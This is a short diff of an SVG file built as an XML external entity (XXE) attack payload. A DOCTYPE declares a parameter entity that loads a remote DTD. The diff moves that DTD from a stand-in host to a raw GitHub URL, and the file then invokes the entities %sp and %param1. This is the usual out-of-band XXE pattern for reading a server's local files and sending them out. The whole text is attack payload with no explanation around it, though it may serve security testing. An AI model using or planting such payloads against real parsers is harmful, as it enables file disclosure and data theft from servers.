@@ -1,7 +1,7 @@
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
 <!ELEMENT svg ANY >
-<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
+<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/sania454/testProj/main/xxe.xml">
 %sp;
 %param1;
 ]>
